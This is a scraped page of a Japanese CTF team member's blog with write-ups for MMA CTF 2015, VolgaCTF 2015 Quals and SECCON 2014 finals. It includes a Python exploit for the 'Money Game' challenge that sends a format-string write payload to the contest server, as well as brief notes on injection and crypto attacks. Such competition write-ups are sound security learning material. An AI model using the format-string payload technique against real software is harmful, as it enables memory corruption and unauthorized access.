[]</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(li)):</div><div class="line">    index = [x <span class="keyword">for</span> x <span class="keyword">in</span> _sortbytes_table <span class="keyword">if</span> x[<span class="number">0</span>] == i][<span class="number">0</span>][<span class="number">1</span>]</div><div class="line">    res += [li[index]]</div><div class="line">  <span class="keyword">return</span> res</div><div class="line"></div><div class="line"></div><div class="line">enc = sortbytes_rev(enc)</div><div class="line"><span class="keyword">print</span> <span class="string">' '</span>.join(map(<span class="keyword">lambda</span> x:hex(x)[<span class="number">2</span>:], enc))</div><div class="line"></div><div class="line">flag = <span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">45</span>):</div><div class="line">  <span class="keyword">print</span> <span class="string">'[*] %d/45'</span> % i</div><div class="line">  <span class="keyword">print</span> flag</div><div class="line">  <span class="keyword">if</span> i == <span class="number">0</span>: flag += chr(byteflip(enc[i]) / <span class="number">2</span>)</div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    kouho = [key[<span class="number">1</span>] <span class="keyword">for</span> key <span class="keyword">in</span> enc_table <span class="keyword">if</span> key[<span class="number">0</span>] == flag[i-<span class="number">1</span>] <span class="keyword">and</span> enc_table[key] == enc[i]]</div><div class="line">    <span class="keyword">if</span> kouho == []: flag += <span class="string">'a'</span></div><div class="line">    <span class="keyword">else</span>: flag += kouho[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>

<p><code>MMA{f9cf7a3ddd5710e85116814fef01c907f4df35ce}</code></p>
<p>配点低すぎない…?</p>
<h2 id="Money_Game">Money Game</h2>
<p>Reverse, PPC, Pwnということで，不穏なジャンルだなあと思いながら解析していた．しゃろプロがゲームクリア後の名前を入力する部分でのfsbの脆弱性を見つけてくれた．<br>ゲーム部分をPPCとして処理する必要があるらしく，また乱数のseed(srand)はtime(NULL)から引いていたのでこれも利用して競プロのプロであるところのとさかプロにお願いしてソルバを書いてもらった．<br>入出力(通信)部分などは僕が書いて，そこからソルバを呼び出して返すようにした．</p>
<figure class="highlight python="><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> ebil <span class="keyword">import</span> *   <span class="comment"># -&gt; https://github.com/193s/ebil</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</div><div class="line"></div><div class="line"><span class="keyword">exec</span> ebil(<span class="string">'./moneygame'</span>, remote=(<span class="string">'pwn1.chal.mmactf.link'</span>, <span class="number">21345</span>))</div><div class="line"></div><div class="line">cmds = check_output(<span class="string">'./solve'</span>).split(<span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_s</span><span class="params">(cmd, a)</span>:</span></div><div class="line">  r.recvregex(<span class="string">'.*Action .*: '</span>)</div><div class="line">  r.sendline(cmd)</div><div class="line">  r.recvuntil(<span class="string">']: '</span>)</div><div class="line">  r.sendline(str(a))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_or_sell</span><span class="params">(cmd, a, b)</span>:</span></div><div class="line">  _s(cmd, a)</div><div class="line">  r.recvuntil(<span class="string">']: '</span>)</div><div class="line">  r.sendline(str(b))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(stock, num)</span>:</span></div><div class="line">  buy_or_sell(<span class="string">'Buy'</span>, stock, num)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span><span class="params">(stock, num)</span>:</span></div><div class="line">  buy_or_sell(<span class="string">'Sell'</span>, stock, num)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">stay</span><span class="params">()</span>:</span></div><div class="line">  r.recvregex(<span class="string">'.*Action .*: '</span>)</div><div class="line">  r.sendline(<span class="string">'Rest'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_or_sell_all</span><span class="params">(cmd, a)</span>:</span></div><div class="line">  _s(cmd, a)</div><div class="line">  r.recvuntil(<span class="string">'0-'</span>)</div><div class="line">  max_num = r.recvuntil(<span class="string">')'</span>, drop=<span class="keyword">True</span>)</div><div class="line">  <span class="comment">#print 'max:', max_num</span></div><div class="line">  r.sendline(str(max_num))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_all</span><span class="params">(stock)</span>:</span></div><div class="line">  buy_or_sell_all(<span class="string">'Buy'</span>, stock)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell_all</span><span class="params">(stock)</span>:</span></div><div class="line">  buy_or_sell_all(<span class="string">'Sell'</span>, stock)</div><div class="line"></div><div class="line"></div><div class="line">restmode = <span class="keyword">False</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">54</span>):</div><div class="line">  r.recvuntil(<span class="string">'Week'</span>)</div><div class="line">  r.recvline()</div><div class="line">  r.recvline() <span class="comment"># you have ??~</span></div><div class="line"></div><div class="line">  items = []</div><div class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]:</div><div class="line">    s = r.recvline()</div><div class="line"></div><div class="line">  <span class="keyword">if</span> restmode:</div><div class="line">    stay()</div><div class="line">    <span class="keyword">continue</span></div><div class="line"></div><div class="line">  cmd = cmds[i]</div><div class="line">  <span class="comment">#print '$', cmd</span></div><div class="line">  <span class="keyword">if</span> cmd == <span class="string">''</span>:</div><div class="line">    restmode = <span class="keyword">True</span></div><div class="line">    stay()</div><div class="line">    <span class="keyword">continue</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> <span class="string">'Stay'</span> <span class="keyword">in</span> cmd: stay()</div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    op = int(cmd.split(<span class="string">' '</span>)[<span class="number">1</span>])+<span class="number">1</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'Sell'</span> <span class="keyword">in</span> cmd: sell_all(op)</div><div class="line">    <span class="keyword">if</span> <span class="string">'Buy'</span>  <span class="keyword">in</span> cmd:  buy_all(op)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recv()</div><div class="line">sendline(<span class="string">'\xb8\xa2\x04\x08%46c%7$hhn'</span>) <span class="comment"># -&gt; flag2</span></div><div class="line"><span class="comment">#sendline('give_me_flag') -&gt; flag1</span></div><div class="line"><span class="keyword">print</span> r.recv()</div></pre></td></tr></table></figure>

<p>特にローカルとの時差はないようなのでそのままローカルの時間で動かすだけで済んだが，精度が良くないようで20回ぐらい実行しないとクリアできなかった．<br>flag2のfsbのpayloadはしゃろプロが事前に書いてくれていたのでそれを入れるだけで取れた．(filenameの”flag1”を”flag2”に書き換えるだけ)</p>
<p>flag1: <code>MMA{YouAreRichPerson}</code><br>flag2: <code>MMA{FLAG_F0rmatStringAttack!}</code></p>
<p>flag2はボーナス問題でした</p>
<h2 id="解けなかった問題">解けなかった問題</h2>
<h3 id="regrettable_ecc">regrettable ecc</h3>
<p>やるだけ，終わってから問題見たらすぐ解けたので本当につらい</p>
<h3 id="login_as_admin!(2)">login as admin!(2)</h3>
<p>memcachedを使っているのはわかっていたがinjectionできるのを知らなかった…</p>
<h3 id="perfect_matching">perfect matching</h3>
<p>PPC部分はとさかプロにソルバをお願いしていて，最初の方のケースではいい感じに動いていたが，問題の生成法則だとgenerator2あたりから解がないケースが出てきてしまう．ずっと回していたがcase 21がまでが限界だった．<br>負数のindexを突っ込むことで同じノードが2回使えるということに気付けず終了（本当にすいません）</p>
<h3 id="alicegame">alicegame</h3>
<p>ElGamal暗号．m=1,r=1みたいなクエリを投げることで公開鍵のパラメータ(p, g, h)は特定できる（ここまではCTF中に書いていた）．</p>
<p>p-1の素因数がある程度小さいとPohlig-Hellman algorithmなどで離散対数(<code>h=g^x mod p</code>なるx = 秘密鍵)が高速に求まる．<br>pは途中から公開されたコードを読むとCrypto.Util.number.getPrime(201)で生成していることがわかる．何回か試行すれば上の条件を満たすpが引けるのでそのまま秘密鍵xを出して終了．<br>書くだけ(まだ解けてない) 時間さえ掛ければ解けていた気がするので悔しい…. 学校休めばよかった…</p>
<h1 id="最後に">最後に</h1>
<p>問題の質もとても良く，本当に楽しいCTFでした．精進します</p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2015-05-05T03:54:10.000Z"><a href="/blog/2015/05/05/VolgaCTF-2015-Quals-Write-up/">May 5 2015</a></time>
      
      
  
    <h1 class="title"><a href="/blog/2015/05/05/VolgaCTF-2015-Quals-Write-up/">VolgaCTF 2015 Quals Write-up</a></h1>
  

    </header>
    <div class="entry">
      
        <p>scryptosです．結果は1800pts 61位でした．<br><img src="/blog/imgs/33a8b.png" alt=""></p>
<p><blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">lcg, math problem, carry, find him, homeworkを解いた(1250pts)</p>&mdash; _ (@_193s) <a href="https://twitter.com/_193s/status/594894623325061120" target="_blank" rel="external">2015, 5月 3</a></blockquote></p>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

<p>自分はlcg, math problem, carry, find him, homeworkを解いて1250pts入れました．  </p>
<p>350pts -&gt; @elliptic_shiho<br>eshiho’s Blog — VolgaCTF 2015 Quals Writeup [<a href="http://shiho-elliptic.tumblr.com/post/118172771134/volgactf-2015-quals-writeup" target="_blank" rel="external">http://shiho-elliptic.tumblr.com/post/118172771134/volgactf-2015-quals-writeup</a>]</p>
<h1 id="lcg_(crypto_100)">lcg (crypto 100)</h1>
<p>線形合同法．flag.png.binから先頭8バイトにpngのsignatureが入ることがわかるのでやるだけ．<br><img src="/blog/imgs/2ef8b.png" alt=""><br><code>{linear_congruential_generator_isn&#39;t_good_for_crypto}</code></p>
<h1 id="math_problem_(ppc_300)">math problem (ppc 300)</h1>
<p>クソコードを書いて総当たりした．  </p>
<script src="https://gist.github.com/193s/b656dbb3b61c7c6a93c6.js"></script>

<h1 id="Carry_(crypto_500)">Carry (crypto 500)</h1>
<p>@elliptic_shihoと真面目に解いていたらkeyの先頭4文字が計算できた．<br>keyは8文字のalphanumeric（多分）で後は4文字特定するだけなのでブルートフォーサを書いて動かしていたところ，<br>計算したkeyの先頭4文字がsanityのコード内のkeyの先頭と一致していることに気がついた．<br>これで復号できたら最悪だよねみたいな話をしながら復号を試みたらFlagが出た．<br><img src="/blog/imgs/3ed65.png" alt=""><br><code>{Approximate_and_synthesize}</code></p>
<h1 id="Find_Him_(recon_250)">Find Him (recon 250)</h1>
<p>やるだけ．</p>
<h1 id="homework_(joy_100)">homework (joy 100)</h1>
<p><img src="http://files.2015.volgactf.ru/homework/homework.jpg" alt=""><br>やるだけ．<br><img src="/blog/imgs/d4b9b.png" alt=""></p>
<script src="https://gist.github.com/193s/cb8e84c3c2f0fdce97bf.js"></script>

<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">It was night, <span class="operator">in</span> <span class="operator">the</span> lonesome October</div><div class="line">Of my most immemorial year:</div><div class="line">It was hard <span class="keyword">by</span> <span class="operator">the</span> dim lake <span class="operator">of</span> Auber,</div><div class="line">In <span class="operator">the</span> misty <span class="keyword">mid</span> region <span class="operator">of</span> Weir-</div><div class="line">It was down <span class="keyword">by</span> <span class="operator">the</span> dank tarn <span class="operator">of</span> Auber,</div><div class="line">In <span class="operator">the</span> ghoul-haunted woodland <span class="operator">of</span> Weir.</div><div class="line"></div><div class="line">Here once, through <span class="operator">an</span> alley Titanic,</div><div class="line">Of cypress, I roamed <span class="operator">with</span> my Soul-</div><div class="line">flag is:</div><div class="line">of_cypress_with_psyche_my_soul</div></pre></td></tr></table></figure>

<p>stegano/ppcがクソ多くてつらいCTFだった．</p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2015-02-11T10:21:21.000Z"><a href="/blog/2015/02/11/seccon-2014-finals/">Feb 11 2015</a></time>
      
      
  
    <h1 class="title"><a href="/blog/2015/02/11/seccon-2014-finals/">SECCON CTF 2014本戦に参加した</a></h1>
  

    </header>
    <div class="entry">
      
        <p><a href="http://2014.seccon.jp/finals.html" target="_blank" rel="external">SECCON CTF 2014 Finals</a>にチームscryptos(@_193s, @a_r_g_v, @kosk_d, @tatarhy)として参加しました．<br>結果は313点で見事24チーム中24位でした．つらい．<br><img src="https://193s.github.io/blog/imgs/ss02.png" alt=""></p>
<h1 id="競技開始前">競技開始前</h1>
<p><blockquote class="twitter-tweet" lang="ja"><p>SECCON前にPC壊れたっぽい</p>&mdash; takoyaki (@a_r_g_v) <a href="https://twitter.com/a_r_g_v/status/563900818814824448" target="_blank" rel="external">2015, 2月 7</a></blockquote></p>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
<blockquote class="twitter-tweet" lang="ja"><p>戦力が半減した</p>&mdash; 193s (@exprsr) <a href="https://twitter.com/exprsr/status/563901460648165376" target="_blank" rel="external">2015, 2月 7</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

<p><blockquote class="twitter-tweet" lang="ja"><p>SECCONです <a href="http://t.co/gjTxYkrbI4" target="_blank" rel="external">pic.twitter.com/gjTxYkrbI4</a></p>&mdash; 193s (@exprsr) <a href="https://twitter.com/exprsr/status/563910064428167168" target="_blank" rel="external">2015, 2月 7</a></blockquote></p>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<h1 id="競技開始_-_13:30">競技開始 - 13:30</h1>
<p>問題は壱〜六の6問で，自分がメインで関わっていた弐と六についてwrite-upを書きます．</p>
<h2 id="弐_-_問題2">弐 - 問題2</h2>
<p>キャプチャ認証付きの掲示板．<br>最新の10投稿だけ残って，5分毎にDefense Keywordが書き込まれているチームにDPが入る．</p>
<p>初King of The Hillで完全に出遅れた．</p>
<h3 id="DP">DP</h3>
<p>単純に自分のチームのキーワードを書き込めば良いことに気が付いて，しばらく手動で書き込み続けていたら13pt入った．<br>途中から手動で書き込むのを諦めて自動化しようと試みたが，キャプチャ解読のコードが書けなかった．<br>手動で得点出来るうちにDP稼いでおけばよかった…</p>
<h3 id="AP">AP</h3>
<p>Mr.Takedaがかなり早い段階でAPを取っていたので案外単純な問題なのでは，と思って無限に時間を溶かしていた．<br>ランキング（5分間に投稿された回数が多い順に並んでいる）で1位を取るとフラグが取れてキャプチャのパラメータを調整できたらしい…..</p>
<h2 id="六_-_問題6">六 - 問題6</h2>
<p>問題の説明は省略します．</p>
<h3 id="AP-1">AP</h3>
<p>1日目の後半に6でAPが楽に稼げることにチームの誰かが気が付いて，300pt確保．</p>
<h3 id="DP-1">DP</h3>
<p>提出用のスクリプトを書いていましたが，結局まともなコードが書けずに1日目終了．完全に頭が回ってなかった．<br>2日目は徹夜で用意してきたコードを投下しようと思ったらトップが30bytes台になっていたので頭が真っ白になりました．</p>
<p><blockquote class="twitter-tweet" lang="ja"><p>6のタイミング見計らって平文そのまま返すスクリプトを投げる作戦うちでもちょっとやったんですけど, タイミングが上手く合わなくて失敗したしつらかった</p>&mdash; 193s (@exprsr) <a href="https://twitter.com/exprsr/status/564777658102194177" target="_blank" rel="external">2015, 2月 9</a></blockquote></p>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

<p><blockquote class="twitter-tweet" lang="ja"><p>len(INPUT)==1024以外なら例外投げるとかそういうので解けない問題が作れるんですけど2日目のトップが36byteとかだったので死んだ</p>&mdash; 193s (@exprsr) <a href="https://twitter.com/exprsr/status/564778063892717571" target="_blank" rel="external">2015, 2月 9</a></blockquote></p>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

<p><blockquote class="twitter-tweet" lang="ja"><p>めちゃくちゃ頑張ってコード短くしても41byteぐらいだったのでおしまいって感じ</p>&mdash; 193s (@exprsr) <a href="https://twitter.com/exprsr/status/564778178510458880" target="_blank" rel="external">2015, 2月 9</a></blockquote></p>
<p><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script><br>以上です．DPで1点も稼げなかったのでとてもつらい…..</p>
<h1 id="感想">感想</h1>
<p>2日目は1点も得点出来ずにバンバン抜かれて，知らないうちにビリになっていました（帰宅中に気が付いた）．<br>なぜか入賞したけどビリだったのでもうダメです．さようなら．</p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  

  <nav id="pagination">
  
  
  <div class="clearfix"></div>
</nav>
</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Search">
    <input type="hidden" name="q" value="site:193s.github.io">
  </form>
</div>

  

  
<div class="widget tag">
  <h3 class="title">Tags</h3>
  <ul class="entry">
  
    <li><a href="/blog/tags/CTF/">CTF</a><small>3</small></li>
  
    <li><a href="/blog/tags/test/">test</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">Recent Posts</h3>
  <ul class="entry">
    
      <li>
        <a href="/blog/2015/09/08/MMACTF2015-writeup/">MMA CTF 1st 2015に出た話 (@_193s)</a>
      </li>
    
      <li>
        <a href="/blog/2015/08/31/tductf2015-writeup/">TDUCTF 2015の感想とwriteup</a>
      </li>
    
      <li>
        <a href="/blog/2015/05/05/VolgaCTF-2015-Quals-Write-up/">VolgaCTF 2015 Quals Write-up</a>
      </li>
    
      <li>
        <a href="/blog/2015/02/11/seccon-2014-finals/">SECCON CTF 2014本戦に参加した</a>
      </li>
    
      <li>
        <a href="/blog/2015/01/05/Hello-World/">Hello World</a>
      </li>
    
  </ul>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2015 193s
  
</div>
<div class="clearfix"></div></footer>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script src="/blog/js/jquery.imagesloaded.min.js"></script>
<script src="/blog/js/gallery.js"></script>




<link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>

</body>
</html>